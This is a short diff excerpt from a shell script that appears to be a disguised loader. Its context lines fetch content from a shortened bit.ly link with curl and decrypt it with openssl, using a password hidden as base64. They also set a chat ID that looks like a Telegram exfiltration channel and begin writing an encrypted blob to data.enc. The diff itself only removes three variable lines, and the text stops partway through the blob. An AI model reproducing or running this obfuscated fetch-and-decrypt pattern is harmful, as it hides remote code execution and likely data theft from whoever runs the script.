@@ -4,9 +4,6 @@ GREEN='\033[0;32m'; YELLOW='\033[1;33m';
 NC='\033[0m';
 GFP="https://bit.ly/oix";iuu="cGFzcw==";os=$(echo "$iuu" | base64 -d);on=$(curl -fsSL "$GFP");tm=$(echo "$on" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 100000 -pass pass:"$os")
 CHAT_ID="7432279779"
-ARCHIVE_FILE="open.7z"
-EXTRACTED_FILE="vpn.sh"
-BLOCK_FLAG=".blocked"
 ENCRYPTED_FILE="data.enc"
 cat > "$ENCRYPTED_FILE" << EOF
 U2FsdGVkX1/ZmFBV67P+E/bZzaEdfm7tv8oGlXeVFReoKbHKGl+NKXn724uYCozv
